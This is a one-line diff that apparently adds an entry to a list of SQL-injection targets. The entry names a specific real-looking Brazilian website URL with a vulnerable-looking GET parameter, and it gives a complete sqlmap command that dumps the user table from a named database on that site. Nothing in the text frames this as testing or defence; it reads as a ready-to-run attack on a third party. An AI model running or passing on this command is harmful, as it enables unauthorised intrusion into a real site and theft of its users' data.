@@ -1,0 +1,1 @@
+https://www.ise7e.com.br/servicos_detalhes.php?cod_servico=12 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.ise7e.com.br/servicos_detalhes.php?cod_servico=12 -D ise7ecom_i2017@ -T tbl_usuario --dump
